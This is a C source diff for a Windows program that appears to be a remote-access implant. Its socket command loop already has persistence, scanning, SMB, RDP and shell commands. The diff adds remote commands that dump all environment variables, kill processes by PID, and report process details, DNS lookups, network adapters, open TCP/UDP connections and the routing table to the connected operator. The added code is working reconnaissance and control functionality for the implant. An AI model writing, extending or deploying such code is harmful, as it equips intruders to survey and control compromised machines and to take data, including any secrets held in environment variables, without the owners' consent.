@@ -199,6 +199,61 @@ typedef BOOL   (WINAPI *PFN_P32F)(HANDLE,TC_PE32*);
 typedef BOOL   (WINAPI *PFN_P32N)(HANDLE,TC_PE32*);
 
 /* -----------------------------------------------------------------------
+ * IP Helper API types (inline, loaded at runtime from iphlpapi.dll)
+ * Available on NT 4+ / Win98+; functions return ERROR_NOT_SUPPORTED or
+ * LoadLibrary fails on NT 3.x — callers check for NULL before use.
+ * ----------------------------------------------------------------------- */
+#define IPHLP_MAX_ADAPTER_NAME 260
+#define IPHLP_MAX_ADAPTER_DESC 132
+#define IPHLP_MAX_ADAPTER_ADDR   8
+
+typedef struct _IPHLP_IP_ADDR_STR {
+    struct _IPHLP_IP_ADDR_STR *Next;
+    char IpAddress[16];
+    char IpMask[16];
+    DWORD Context;
+} IPHLP_IP_ADDR_STR;
+
+typedef struct _IPHLP_ADAPTER_INFO {
+    struct _IPHLP_ADAPTER_INFO *Next;
+    DWORD  ComboIndex;
+    char   AdapterName[IPHLP_MAX_ADAPTER_NAME];
+    char   Description[IPHLP_MAX_ADAPTER_DESC];
+    UINT   AddressLength;
+    BYTE   Address[IPHLP_MAX_ADAPTER_ADDR];
+    DWORD  Index;
+    UINT   Type;
+    UINT   DhcpEnabled;
+    IPHLP_IP_ADDR_STR *CurrentIpAddress;
+    IPHLP_IP_ADDR_STR  IpAddressList;
+    IPHLP_IP_ADDR_STR  GatewayList;
+    IPHLP_IP_ADDR_STR  DhcpServer;
+    BOOL               HaveWins;
+    IPHLP_IP_ADDR_STR  PrimaryWinsServer;
+    IPHLP_IP_ADDR_STR  SecondaryWinsServer;
+    DWORD              LeaseObtained;
+    DWORD              LeaseExpires;
+} IPHLP_ADAPTER_INFO;
+typedef DWORD (WINAPI *pfGetAdaptersInfo)(IPHLP_ADAPTER_INFO *, PULONG);
+
+typedef struct { DWORD dwState,dwLocalAddr,dwLocalPort,dwRemoteAddr,dwRemotePort; } IPHLP_TCPROW;
+typedef struct { DWORD dwNumEntries; IPHLP_TCPROW  table[1]; } IPHLP_TCPTABLE;
+typedef DWORD (WINAPI *pfGetTcpTable)(PVOID, PDWORD, BOOL);
+
+typedef struct { DWORD dwLocalAddr, dwLocalPort; } IPHLP_UDPROW;
+typedef struct { DWORD dwNumEntries; IPHLP_UDPROW  table[1]; } IPHLP_UDPTABLE;
+typedef DWORD (WINAPI *pfGetUdpTable)(PVOID, PDWORD, BOOL);
+
+typedef struct {
+    DWORD dwForwardDest,dwForwardMask,dwForwardPolicy,dwForwardNextHop;
+    DWORD dwForwardIfIndex,dwForwardType,dwForwardProto,dwForwardAge;
+    DWORD dwForwardNextHopAS;
+    DWORD dwForwardMetric1,dwForwardMetric2,dwForwardMetric3,dwForwardMetric4,dwForwardMetric5;
+} IPHLP_IPFWDROW;
+typedef struct { DWORD dwNumEntries; IPHLP_IPFWDROW table[1]; } IPHLP_IPFWDTABLE;
+typedef DWORD (WINAPI *pfGetIpForwardTable)(PVOID, PDWORD, BOOL);
+
+/* -----------------------------------------------------------------------
  * External: Recognizer module (recognizer.c)
  * ----------------------------------------------------------------------- */
 extern int recognizer_check(void);
@@ -1311,6 +1366,277 @@ static int cmd_persist(SOCKET s, const char *args)
     return send_done(s);
 }
 
+/* -----------------------------------------------------------------------
+ * cmd_env — list all environment variables
+ * ----------------------------------------------------------------------- */
+static int cmd_env(SOCKET s)
+{
+    char *env = GetEnvironmentStrings();
+    char *p;
+    if (!env) { send_str(s,"env: GetEnvironmentStrings failed\r\n"); return send_done(s); }
+    for (p = env; *p; ) {
+        int n = lstrlen(p);
+        send_str(s, p); send_str(s, "\r\n");
+        p += n + 1;
+    }
+    FreeEnvironmentStrings(env);
+    return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * cmd_kill — terminate a process by PID
+ * ----------------------------------------------------------------------- */
+static int cmd_kill(SOCKET s, const char *arg)
+{
+    DWORD  pid;
+    HANDLE h;
+    char   line[80];
+    if (!arg||!arg[0]) { send_str(s,"kill: usage: kill <pid>\r\n"); return send_done(s); }
+    pid = (DWORD)atol(arg);
+    h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+    if (!h) {
+        wsprintf(line,"kill: OpenProcess(%lu) failed (%lu)\r\n",pid,GetLastError());
+        send_str(s,line); return send_done(s);
+    }
+    if (!TerminateProcess(h,1)) {
+        wsprintf(line,"kill: TerminateProcess(%lu) failed (%lu)\r\n",pid,GetLastError());
+        CloseHandle(h); send_str(s,line); return send_done(s);
+    }
+    CloseHandle(h);
+    wsprintf(line,"kill: pid %lu terminated\r\n",pid);
+    send_str(s,line);
+    return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * cmd_pinfo — detailed info for one process (ToolHelp32)
+ * ----------------------------------------------------------------------- */
+static int cmd_pinfo(SOCKET s, const char *arg)
+{
+    HMODULE  hK = GetModuleHandle("kernel32.dll");
+    PFN_CTS  fCTS  = hK ? (PFN_CTS) GetProcAddress(hK,"CreateToolhelp32Snapshot") : NULL;
+    PFN_P32F fP32F = hK ? (PFN_P32F)GetProcAddress(hK,"Process32First") : NULL;
+    PFN_P32N fP32N = hK ? (PFN_P32N)GetProcAddress(hK,"Process32Next")  : NULL;
+    HANDLE   snap;
+    TC_PE32  pe;
+    DWORD    pid;
+    char     line[MAX_PATH+128];
+    int      found = 0;
+
+    if (!arg||!arg[0]) { send_str(s,"pinfo: usage: pinfo <pid>\r\n"); return send_done(s); }
+    pid = (DWORD)atol(arg);
+    if (!fCTS||!fP32F||!fP32N) { send_str(s,"pinfo: ToolHelp32 not available\r\n"); return send_done(s); }
+    snap = fCTS(TC_TH32CS_SNAPPROCESS,0);
+    if (snap==INVALID_HANDLE_VALUE) { send_str(s,"pinfo: snapshot failed\r\n"); return send_done(s); }
+    pe.dwSize = sizeof(pe);
+    if (fP32F(snap,&pe)) do {
+        if (pe.th32ProcessID==pid) {
+            wsprintf(line,"PID:     %lu\r\nParent:  %lu\r\nThreads: %lu\r\nName:    %s\r\n",
+                     pe.th32ProcessID,pe.th32ParentProcessID,pe.cntThreads,pe.szExeFile);
+            send_str(s,line); found=1; break;
+        }
+    } while (fP32N(snap,&pe));
+    CloseHandle(snap);
+    if (!found) { wsprintf(line,"pinfo: pid %lu not found\r\n",pid); send_str(s,line); }
+    return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * cmd_resolve — DNS forward / reverse lookup
+ * ----------------------------------------------------------------------- */
+static int cmd_resolve(SOCKET s, const char *arg)
+{
+    struct hostent *he;
+    struct in_addr  ia;
+    char   line[256];
+    int    i;
+
+    if (!arg||!arg[0]) { send_str(s,"resolve: usage: resolve <host>\r\n"); return send_done(s); }
+    he = gethostbyname(arg);
+    if (!he) {
+        wsprintf(line,"resolve: %s: not found (WSA %d)\r\n",arg,WSAGetLastError());
+        send_str(s,line); return send_done(s);
+    }
+    wsprintf(line,"Name: %s\r\n",he->h_name); send_str(s,line);
+    for (i=0; he->h_aliases&&he->h_aliases[i]; i++) {
+        wsprintf(line,"      %s\r\n",he->h_aliases[i]); send_str(s,line);
+    }
+    for (i=0; he->h_addr_list[i]; i++) {
+        memcpy(&ia,he->h_addr_list[i],sizeof(ia));
+        wsprintf(line,"  %s\r\n",inet_ntoa(ia)); send_str(s,line);
+    }
+    return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * cmd_ifconfig — list network adapters via iphlpapi (NT4+ / Win98+)
+ * ----------------------------------------------------------------------- */
+static int cmd_ifconfig(SOCKET s)
+{
+    HMODULE hIP = LoadLibrary("iphlpapi.dll");
+    pfGetAdaptersInfo fGetAI = hIP ? (pfGetAdaptersInfo)GetProcAddress(hIP,"GetAdaptersInfo") : NULL;
+    IPHLP_ADAPTER_INFO *info;
+    IPHLP_ADAPTER_INFO *p;
+    ULONG  sz;
+    char   line[512];
+    int    i;
+
+    if (!fGetAI) {
+        if (hIP) FreeLibrary(hIP);
+        send_str(s,"ifconfig: iphlpapi not available (NT<4)\r\n");
+        return send_done(s);
+    }
+    sz   = 16384;
+    info = (IPHLP_ADAPTER_INFO *)GlobalAlloc(GMEM_FIXED, sz);
+    if (!info) { FreeLibrary(hIP); return send_done(s); }
+    if (fGetAI(info,&sz) != 0) {
+        GlobalFree(info); FreeLibrary(hIP);
+        send_str(s,"ifconfig: GetAdaptersInfo failed\r\n");
+        return send_done(s);
+    }
+    for (p=info; p; p=p->Next) {
+        IPHLP_IP_ADDR_STR *ip;
+        const char *atype;
+        char mac[28]; char *mp = mac;
+        *mp = '\0';
+        switch(p->Type){
+        case  6: atype="Ethernet"; break;
+        case 23: atype="PPP";      break;
+        case 24: atype="Loopback"; break;
+        case 28: atype="SLIP";     break;
+        default: atype="Other";    break;
+        }
+        wsprintf(line,"%-4lu  %-30s  %s\r\n",
+                 p->Index, p->Description[0]?p->Description:p->AdapterName, atype);
+        send_str(s,line);
+        if (p->AddressLength > 0) {
+            for (i=0; i<(int)p->AddressLength&&i<8; i++) {
+                if (i) *mp++='-';
+                *mp++="0123456789ABCDEF"[p->Address[i]>>4];
+                *mp++="0123456789ABCDEF"[p->Address[i]&0xF];
+            }
+            *mp='\0';
+            wsprintf(line,"      MAC: %s\r\n",mac); send_str(s,line);
+        }
+        for (ip=&p->IpAddressList; ip; ip=ip->Next) {
+            if (!ip->IpAddress[0]||lstrcmp(ip->IpAddress,"0.0.0.0")==0) continue;
+            wsprintf(line,"      inet %s  mask %s  %s\r\n",
+                     ip->IpAddress,ip->IpMask,p->DhcpEnabled?"DHCP":"static");
+            send_str(s,line);
+        }
+        if (p->GatewayList.IpAddress[0]&&lstrcmp(p->GatewayList.IpAddress,"0.0.0.0")!=0) {
+            wsprintf(line,"      gw   %s\r\n",p->GatewayList.IpAddress); send_str(s,line);
+        }
+        send_str(s,"\r\n");
+    }
+    GlobalFree(info); FreeLibrary(hIP);
+    return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * cmd_netstat — active TCP/UDP connections via iphlpapi (NT4+ / Win98+)
+ * ----------------------------------------------------------------------- */
+static const char *tcp_state_name(DWORD st) {
+    switch(st) {
+    case  1: return "CLOSED";      case  2: return "LISTEN";
+    case  3: return "SYN_SENT";    case  4: return "SYN_RCVD";
+    case  5: return "ESTABLISHED"; case  6: return "FIN_WAIT1";
+    case  7: return "FIN_WAIT2";   case  8: return "CLOSE_WAIT";
+    case  9: return "CLOSING";     case 10: return "LAST_ACK";
+    case 11: return "TIME_WAIT";   case 12: return "DELETE_TCB";
+    default: return "UNKNOWN";
+    }
+}
+
+static int cmd_netstat(SOCKET s)
+{
+    HMODULE hIP = LoadLibrary("iphlpapi.dll");
+    pfGetTcpTable fGetTCP = hIP ? (pfGetTcpTable)GetProcAddress(hIP,"GetTcpTable") : NULL;
+    pfGetUdpTable fGetUDP = hIP ? (pfGetUdpTable)GetProcAddress(hIP,"GetUdpTable") : NULL;
+    char  *buf;
+    DWORD  sz;
+    char   line[128];
+    DWORD  i;
+
+    if (!fGetTCP||!fGetUDP) {
+        if (hIP) FreeLibrary(hIP);
+        send_str(s,"netstat: iphlpapi not available (NT<4)\r\n");
+        return send_done(s);
+    }
+    send_str(s,"Proto  Local                  Remote                 State\r\n");
+
+    sz=8192; buf=(char *)GlobalAlloc(GMEM_FIXED,sz);
+    if (buf&&fGetTCP(buf,&sz,TRUE)==0) {
+        IPHLP_TCPTABLE *t=(IPHLP_TCPTABLE *)buf;
+        for (i=0; i<t->dwNumEntries; i++) {
+            struct in_addr la,ra; char ls[24],rs[24];
+            la.s_addr=t->table[i].dwLocalAddr;
+            ra.s_addr=t->table[i].dwRemoteAddr;
+            wsprintf(ls,"%s:%u",inet_ntoa(la),ntohs((WORD)t->table[i].dwLocalPort));
+            wsprintf(rs,"%s:%u",inet_ntoa(ra),ntohs((WORD)t->table[i].dwRemotePort));
+            wsprintf(line,"TCP    %-22s %-22s %s\r\n",ls,rs,tcp_state_name(t->table[i].dwState));
+            send_str(s,line);
+        }
+    }
+    if (buf) GlobalFree(buf);
+
+    sz=8192; buf=(char *)GlobalAlloc(GMEM_FIXED,sz);
+    if (buf&&fGetUDP(buf,&sz,TRUE)==0) {
+        IPHLP_UDPTABLE *t=(IPHLP_UDPTABLE *)buf;
+        for (i=0; i<t->dwNumEntries; i++) {
+            struct in_addr la; char ls[24];
+            la.s_addr=t->table[i].dwLocalAddr;
+            wsprintf(ls,"%s:%u",inet_ntoa(la),ntohs((WORD)t->table[i].dwLocalPort));
+            wsprintf(line,"UDP    %-22s *:*\r\n",ls);
+            send_str(s,line);
+        }
+    }
+    if (buf) GlobalFree(buf);
+    if (hIP) FreeLibrary(hIP);
+    return send_done(s);
+}
+
+/* -----------------------------------------------------------------------
+ * cmd_route — IP routing table via iphlpapi (NT4+ / Win98+)
+ * ----------------------------------------------------------------------- */
+static int cmd_route(SOCKET s)
+{
+    HMODULE hIP = LoadLibrary("iphlpapi.dll");
+    pfGetIpForwardTable fGetRT = hIP ? (pfGetIpForwardTable)GetProcAddress(hIP,"GetIpForwardTable") : NULL;
+    char  *buf;
+    DWORD  sz;
+    char   line[256];
+    DWORD  i;
+
+    if (!fGetRT) {
+        if (hIP) FreeLibrary(hIP);
+        send_str(s,"route: iphlpapi not available (NT<4)\r\n");
+        return send_done(s);
+    }
+    sz=16384; buf=(char *)GlobalAlloc(GMEM_FIXED,sz);
+    if (!buf) { if (hIP) FreeLibrary(hIP); return send_done(s); }
+    if (fGetRT(buf,&sz,TRUE)==0) {
+        IPHLP_IPFWDTABLE *t=(IPHLP_IPFWDTABLE *)buf;
+        send_str(s,"Destination     Mask            Gateway         If   Metric\r\n");
+        for (i=0; i<t->dwNumEntries; i++) {
+            struct in_addr dest,mask,gw;
+            char ds[16],ms[16],gs[16];
+            dest.s_addr=t->table[i].dwForwardDest;
+            mask.s_addr=t->table[i].dwForwardMask;
+            gw.s_addr  =t->table[i].dwForwardNextHop;
+            lstrcpy(ds,inet_ntoa(dest));
+            lstrcpy(ms,inet_ntoa(mask));
+            lstrcpy(gs,inet_ntoa(gw));
+            wsprintf(line,"%-15s %-15s %-15s %3lu  %6lu\r\n",
+                     ds,ms,gs,t->table[i].dwForwardIfIndex,t->table[i].dwForwardMetric1);
+            send_str(s,line);
+        }
+    }
+    GlobalFree(buf);
+    if (hIP) FreeLibrary(hIP);
+    return send_done(s);
+}
+
 /* Forward declarations for commands defined later but called from cmd_shell */
 static int cmd_smb(SOCKET s, const char *args);
 static int cmd_rdp(SOCKET s, const char *args);
@@ -1975,6 +2301,13 @@ static void run_session(SOCKET s)
         else if(cmd_is(cmd,"less"))       rc=cmd_less(s,cmd_arg(cmd,"less"));
         else if(cmd_is(cmd,"persist"))    rc=cmd_persist(s,cmd_arg(cmd,"persist"));
         else if(cmd_is(cmd,"scan"))       rc=cmd_scan(s,cmd_arg(cmd,"scan"));
+        else if(cmd_is(cmd,"env"))        rc=cmd_env(s);
+        else if(cmd_is(cmd,"kill"))       rc=cmd_kill(s,cmd_arg(cmd,"kill"));
+        else if(cmd_is(cmd,"pinfo"))      rc=cmd_pinfo(s,cmd_arg(cmd,"pinfo"));
+        else if(cmd_is(cmd,"resolve"))    rc=cmd_resolve(s,cmd_arg(cmd,"resolve"));
+        else if(cmd_is(cmd,"ifconfig"))   rc=cmd_ifconfig(s);
+        else if(cmd_is(cmd,"netstat"))    rc=cmd_netstat(s);
+        else if(cmd_is(cmd,"route"))      rc=cmd_route(s);
         else if(cmd_is(cmd,"shell"))      rc=cmd_shell(s,shell);
         else                              rc=exec_command(s,cmd,shell);
         if(rc<0) return;
